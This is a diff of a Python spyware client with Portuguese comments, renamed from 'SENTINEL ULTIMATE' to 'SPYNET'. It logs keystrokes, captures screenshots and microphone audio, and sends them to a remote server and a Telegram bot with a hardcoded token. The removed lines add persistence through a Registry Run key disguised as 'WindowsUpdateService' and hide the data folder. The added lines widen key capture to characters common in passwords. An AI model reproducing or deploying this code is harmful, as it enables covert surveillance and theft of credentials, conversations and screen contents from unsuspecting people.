@@ -1,8 +1,6 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 """
-SENTINEL ULTIMATE - CLIENTE LOCAL
-Roda no PC monitorado e envia dados para o servidor online
+SPYNET CLIENTE LOCAL - Monitoramento em Tempo Real
+Roda no computador do cliente e envia dados para o servidor online
 """
 
 import os
@@ -17,35 +15,28 @@ from pynput import keyboard
 from datetime import datetime
 import numpy as np
 import json
-import ctypes
-import winreg
+import base64
 
 # ============================================
 # CONFIGURAÇÕES
 # ============================================
 
-# URL do seu servidor online no Render
-SERVIDOR_URL = 'https://sentinel-monitor.onrender.com'  # Substitua pelo seu URL
+# URL DO SEU SERVIDOR NO RENDER
+SERVIDOR_URL = "https://sentinel-monitor.onrender.com"
 
-# Telegram (envio direto também)
-BOT_TOKEN = '8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0'
-CHAT_ID = '5672315001'
+# Telegram (opcional - enviar direto também)
+BOT_TOKEN = "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0"
+CHAT_ID = "5672315001"
 
 # Pastas locais
 DATA_DIR = "SystemData"
-LOG_DIR = os.path.join(DATA_DIR, "Logs")
-SCREENSHOT_DIR = os.path.join(DATA_DIR, "Cache")
-AUDIO_DIR = os.path.join(DATA_DIR, "Temp")
+LOG_DIR = os.path.join(DATA_DIR, "logs")
+SCREENSHOT_DIR = os.path.join(DATA_DIR, "screenshots")
+AUDIO_DIR = os.path.join(DATA_DIR, "audio")
 KEYLOG_PATH = os.path.join(LOG_DIR, "syslog.txt")
 
 for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
     os.makedirs(pasta, exist_ok=True)
-
-# Ocultar pasta
-try:
-    ctypes.windll.kernel32.SetFileAttributesW(DATA_DIR, 2)
-except:
-    pass
 
 # Variáveis
 monitor_ativo = True
@@ -53,92 +44,51 @@ tempo_screenshot = 5
 tempo_audio = 10
 ultima_screenshot = None
 ultimo_audio = None
-ultimas_frases = []
+ultimas_teclas = []
 buffer_teclas = ""
 ultimo_tempo = time.time()
 
-estatisticas = {
-    'screenshots': 0,
-    'audios': 0,
-    'teclas': 0,
-    'palavras': 0,
-    'start_time': time.time()
-}
-
 # ============================================
-# PERSISTÊNCIA (INICIAR COM WINDOWS)
+# FUNÇÕES
 # ============================================
 
-def adicionar_startup():
+def enviar_telegram(texto, caminho=None):
     try:
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-            winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
-        return True
+        if caminho and os.path.exists(caminho):
+            with open(caminho, "rb") as f:
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+                requests.post(url, data={"chat_id": CHAT_ID, "caption": texto}, files={"document": f}, timeout=5)
+        else:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
     except:
-        return False
-
-adicionar_startup()
-
-# ============================================
-# ENVIO PARA SERVIDOR E TELEGRAM
-# ============================================
+        pass
 
 def enviar_para_servidor(tipo, dados):
     """Envia dados para o servidor online"""
     try:
-        url = f"{SERVIDOR_URL}/upload_data"
-        payload = {}
-        
-        if tipo == 'screenshot':
-            # Enviar screenshot como base64
-            import base64
-            with open(dados, 'rb') as f:
-                payload['screenshot'] = base64.b64encode(f.read()).decode()
-        elif tipo == 'audio':
-            import base64
-            with open(dados, 'rb') as f:
-                payload['audio'] = base64.b64encode(f.read()).decode()
-        elif tipo == 'teclas':
-            payload['teclas'] = dados
-        
-        if payload:
-            response = requests.post(url, json=payload, timeout=10)
-            return response.status_code == 200
+        url = f"{SERVIDOR_URL}/api/upload"
+        if tipo == "screenshot" and os.path.exists(dados):
+            with open(dados, "rb") as f:
+                files = {"screenshot": f}
+                requests.post(url, files=files, timeout=10)
+        elif tipo == "audio" and os.path.exists(dados):
+            with open(dados, "rb") as f:
+                files = {"audio": f}
+                requests.post(url, files=files, timeout=10)
+        elif tipo == "teclas":
+            requests.post(url, json={"teclas": dados}, timeout=10)
     except Exception as e:
         print(f"Erro ao enviar para servidor: {e}")
-        return False
-
-def enviar_telegram_mensagem(texto):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
-    except:
-        pass
-
-def enviar_telegram_arquivo(caminho, legenda):
-    try:
-        with open(caminho, "rb") as f:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            requests.post(url, data={"chat_id": CHAT_ID, "caption": legenda}, files={"document": f}, timeout=10)
-    except:
-        pass
-
-# ============================================
-# KEYLOGGER
-# ============================================
 
 def processar_tecla(tecla):
-    global buffer_teclas, ultimas_frases, estatisticas, ultimo_tempo, monitor_ativo
+    global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
     if not monitor_ativo:
         return
-    
     try:
         if hasattr(tecla, 'char') and tecla.char:
             caractere = tecla.char
-            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?']:
+            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?', '@', '#', '$', '-', '_']:
                 buffer_teclas += caractere
                 ultimo_tempo = time.time()
             elif caractere == '\r' or caractere == '\n':
@@ -154,6 +104,8 @@ def processar_tecla(tecla):
                 if buffer_teclas.strip():
                     registrar_frase(buffer_teclas.strip())
                 buffer_teclas = ""
+            elif tecla_nome == 'backspace':
+                buffer_teclas = buffer_teclas[:-1]
         
         if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
             registrar_frase(buffer_teclas.strip())
@@ -162,39 +114,20 @@ def processar_tecla(tecla):
         pass
 
 def registrar_frase(frase):
-    global ultimas_frases, estatisticas
+    global ultimas_teclas
     if not frase.strip():
         return
-    
-    timestamp = datetime.now().strftime("%H:%M:%S")
-    registro = f"[{timestamp}] {frase}"
-    
+    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
     with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
         f.write(registro + "\n")
-    
-    ultimas_frases.append(registro)
-    if len(ultimas_frases) > 100:
-        ultimas_frases.pop(0)
-    
-    estatisticas['teclas'] += len(frase)
-    estatisticas['palavras'] += 1
-    
-    # Enviar para Telegram
-    enviar_telegram_mensagem(f"⌨️ {frase}")
-    
-    # Enviar para servidor
-    enviar_para_servidor('teclas', [registro])
-
-def iniciar_keylogger():
-    with keyboard.Listener(on_press=processar_tecla) as listener:
-        listener.join()
-
-# ============================================
-# CAPTURAS
-# ============================================
+    ultimas_teclas.append(registro)
+    if len(ultimas_teclas) > 100:
+        ultimas_teclas.pop(0)
+    enviar_telegram(f"⌨️ {frase}")
+    enviar_para_servidor("teclas", [registro])
 
 def capturar_screenshot():
-    global ultima_screenshot, estatisticas, monitor_ativo
+    global ultima_screenshot, monitor_ativo
     if not monitor_ativo:
         return None
     try:
@@ -202,47 +135,30 @@ def capturar_screenshot():
         caminho = os.path.join(SCREENSHOT_DIR, nome)
         pyautogui.screenshot(caminho)
         ultima_screenshot = caminho
-        estatisticas['screenshots'] += 1
-        
-        # Enviar para Telegram
-        enviar_telegram_arquivo(caminho, "📸 Screenshot")
-        
-        # Enviar para servidor online
-        enviar_para_servidor('screenshot', caminho)
-        
+        enviar_telegram("📸 Screenshot", caminho)
+        enviar_para_servidor("screenshot", caminho)
         return caminho
-    except Exception as e:
-        print(f"Erro screenshot: {e}")
+    except:
         return None
 
 def capturar_audio():
-    global ultimo_audio, estatisticas, monitor_ativo
+    global ultimo_audio, monitor_ativo
     if not monitor_ativo:
         return None
     try:
         nome = f"aud_{int(time.time())}.wav"
         caminho = os.path.join(AUDIO_DIR, nome)
-        
         fs = 44100
         duracao = 5
-        
         gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=2, dtype='float32')
         sd.wait()
         gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
         sf.write(caminho, gravacao, fs)
-        
         ultimo_audio = caminho
-        estatisticas['audios'] += 1
-        
-        # Enviar para Telegram
-        enviar_telegram_arquivo(caminho, "🎤 Áudio")
-        
-        # Enviar para servidor online
-        enviar_para_servidor('audio', caminho)
-        
+        enviar_telegram("🎤 Áudio", caminho)
+        enviar_para_servidor("audio", caminho)
         return caminho
-    except Exception as e:
-        print(f"Erro áudio: {e}")
+    except:
         return None
 
 def loop_captura():
@@ -259,34 +175,31 @@ def loop_audio():
             capturar_audio()
         time.sleep(tempo_audio)
 
+def iniciar_keylogger():
+    with keyboard.Listener(on_press=processar_tecla) as listener:
+        listener.join()
+
 # ============================================
 # MAIN
 # ============================================
 
 if __name__ == "__main__":
-    print("\n" + "=" * 60)
-    print("🛡️ SENTINEL ULTIMATE - CLIENTE LOCAL")
     print("=" * 60)
-    print("✅ Monitoramento ATIVADO")
-    print(f"📸 Screenshot: a cada {tempo_screenshot} segundos")
-    print(f"🎤 Áudio: a cada {tempo_audio} segundos")
-    print(f"⌨️ Keylogger: em tempo real")
+    print("🛡️ SPYNET CLIENTE LOCAL - MONITORAMENTO")
+    print("=" * 60)
     print(f"📡 Enviando dados para: {SERVIDOR_URL}")
-    print("=" * 60)
-    print("")
-    print("🛑 Pressione CTRL+C para parar")
+    print(f"📸 Screenshot: a cada {tempo_screenshot}s")
+    print(f"🎤 Áudio: a cada {tempo_audio}s")
+    print(f"⌨️ Keylogger: ativo")
     print("=" * 60)
     
-    # Enviar mensagem de início
-    enviar_telegram_mensagem("🛡️ SENTINEL CLIENTE LOCAL INICIADO!")
+    enviar_telegram("🛡️ SPYNET CLIENTE LOCAL INICIADO!")
     
-    # Iniciar threads
     threading.Thread(target=iniciar_keylogger, daemon=True).start()
     threading.Thread(target=loop_captura, daemon=True).start()
     threading.Thread(target=loop_audio, daemon=True).start()
     
     try:
-        # Manter o programa rodando
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
